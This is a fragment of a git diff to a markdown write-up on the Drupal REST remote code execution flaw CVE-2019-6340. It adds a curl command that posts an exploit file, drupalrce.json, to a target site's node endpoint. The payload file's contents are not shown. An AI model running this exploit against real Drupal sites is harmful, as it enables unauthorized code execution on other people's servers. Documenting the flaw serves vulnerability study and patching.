@@ -25,3 +25,9 @@ CVE-2019-6340 isn’t a default configuration, you have to manually enable Restf
 
 
 ![marty-mcfly](https://pbs.twimg.com/media/D0EShBfWwAEXxK0.jpg:large)
+
+
+Command
+$ curl -k -v -H 'Content-Type: application/json' -d @./drupalrce.json 'https://<http://your.web.site >/node/<node_id>?_format=hal_json'
+
+file drupalrce.json
